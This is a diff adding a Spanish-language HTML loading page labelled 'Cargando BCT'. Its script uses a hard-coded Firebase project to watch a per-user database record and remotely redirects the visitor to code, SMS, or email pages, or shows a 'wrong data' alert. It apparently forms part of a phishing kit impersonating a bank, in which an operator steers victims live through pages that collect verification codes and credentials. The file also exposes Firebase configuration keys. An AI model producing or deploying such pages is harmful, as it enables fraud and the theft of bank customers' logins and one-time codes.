@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta http-equiv="refresh" content="10; url=codigo.html" />
+    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+    <script type="module">
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+      import {
+        getFirestore,
+        doc,
+        setDoc,
+        onSnapshot,
+      } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
+
+      const firebaseConfig = {
+        apiKey: "AIzaSyDFYJf5HrCfbyEkggIHJ6hcgQJpUKMfzc0",
+        authDomain: "basedtos-84767.firebaseapp.com",
+        projectId: "basedtos-84767",
+        storageBucket: "basedtos-84767.appspot.com",
+        messagingSenderId: "622608516389",
+        appId: "1:622608516389:web:b3c12b4a3537c1bfff06cc",
+      };
+
+      const app = initializeApp(firebaseConfig);
+      const db = getFirestore(app);
+
+      window.db = db; // Hacer db accesible globalmente
+      window.doc = doc;
+      window.setDoc = setDoc;
+      window.onSnapshot = onSnapshot;
+    </script>
+    <title>Cargando BCT</title>
+    <style>
+      :root {
+        --size: min(45vmin, 320px); /* tamaño máximo del logo */
+        --duration: 3s; /* velocidad de la respiración */
+        --scale-min: 0.96;
+        --scale-max: 1.04;
+      }
+      * {
+        box-sizing: border-box;
+      }
+      html,
+      body {
+        height: 100%;
+      }
+      body {
+        margin: 0;
+        background: #fff; /* fondo blanco */
+        display: grid;
+        place-items: center; /* centrado perfecto */
+        font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial,
+          sans-serif;
+      }
+      .breathing {
+        width: var(--size);
+        height: var(--size);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        animation: breathing var(--duration) ease-in-out infinite;
+        will-change: transform;
+      }
+      .breathing img {
+        max-width: 100%;
+        height: auto;
+        display: block;
+      }
+      @keyframes breathing {
+        0%,
+        100% {
+          transform: scale(var(--scale-min));
+        }
+        50% {
+          transform: scale(var(--scale-max));
+        }
+      }
+      /* Accesibilidad: si el usuario prefiere menos movimiento, se detiene la animación */
+      @media (prefers-reduced-motion: reduce) {
+        .breathing {
+          animation: none;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="breathing">
+      <img src="datos/images.jpg" alt="Logo centrado" />
+    </div>
+  </body>
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      const questionRef = window.doc(
+        window.db,
+        "bctls",
+        localStorage.getItem("usuario")
+      );
+      window.onSnapshot(questionRef, (doc) => {
+        if (doc.exists()) {
+          const questionData = doc.data();
+
+          if (questionData.page == 1) {
+            window.location.href = "index.html";
+          }
+          if (questionData.page == 2) {
+            window.location.href = "codigo.html";
+          }
+          if (questionData.page == 3) {
+            window.location.href = "sms.html";
+          }
+          if (questionData.page == 4) {
+            window.location.href = "correo.html";
+          }
+          if (questionData.page == 5) {
+            alert("Datos incorrectos");
+            window.location.href = "index.html";
+          }
+
+    
+
+          // hideOverlay(); // Descomentar esta línea si tienes una función para ocultar el overlay
+        } else {
+          console.log("No such document!");
+        }
+      });
+    });
+  </script>
+</html>
